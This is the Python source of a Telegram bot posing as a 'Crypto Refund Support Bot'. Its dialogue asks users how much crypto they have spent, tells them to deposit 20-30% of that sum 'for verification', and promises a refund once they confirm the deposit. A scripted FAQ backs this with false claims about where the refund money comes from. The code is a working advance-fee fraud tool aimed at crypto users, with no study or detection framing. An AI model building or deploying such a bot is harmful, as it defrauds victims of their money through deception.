from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ContextTypes, filters
from keep_alive import keep_alive

import os
TOKEN = os.getenv("TOKEN")

main_menu = [["Check Eligibility", "FAQ"], ["Talk to Support"]]

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user.first_name
    reply_markup = ReplyKeyboardMarkup(main_menu, one_time_keyboard=True, resize_keyboard=True)
    await update.message.reply_text(
        f"Hi {user}, welcome to the Crypto Refund Support Bot.\n\nPlease choose an option to begin:",
        reply_markup=reply_markup
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip().lower()
    state = context.user_data.get("state")

    if "eligibility" in text:
        await update.message.reply_text("Have you used crypto in the past few years? (Yes / No)")
        context.user_data["state"] = "ask_used"

    elif text in ["yes", "yeah", "i did"] and state == "ask_used":
        await update.message.reply_text("Great! Roughly how much do you think you've spent?")
        context.user_data["state"] = "ask_estimate"

    elif state == "ask_estimate":
        await update.message.reply_text(
            "👍 Thanks! Please deposit around 20‑30% of that amount into your wallet to verify it. "
            "Once done, type 'Deposit Complete'."
        )
        context.user_data["state"] = "await_deposit"

    elif "deposit complete" in text:
        await update.message.reply_text("✅ Verification in progress — refund will be processed shortly.")

    elif "faq" in text:
        await update.message.reply_text(
            "🧾 *FAQ*:\n"
            "- *Why now?* → Refund tracking just went live.\n"
            "- *Is it safe?* → You never share private keys.\n"
            "- *Deposit needed?* → Yes, 20‑30% for verification.\n"
            "- *Source of funds?* → Validator incentives + protocol reserves."
        )

    elif "support" in text:
        await update.message.reply_text("🔧 Live support: please describe your concern.")

    else:
        await update.message.reply_text("Type /start or choose an option to proceed.")

if __name__ == "__main__":
    keep_alive()
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.run_polling()
